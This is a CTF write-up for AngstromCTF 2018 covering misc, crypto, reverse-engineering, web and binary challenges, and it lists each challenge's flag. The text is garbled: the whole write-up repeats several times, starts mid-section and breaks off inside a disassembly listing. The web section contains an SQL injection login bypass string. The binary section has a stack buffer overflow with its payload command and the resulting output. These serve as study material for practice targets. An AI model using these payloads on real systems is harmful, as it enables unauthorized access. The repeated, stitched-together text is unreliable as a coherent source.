Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
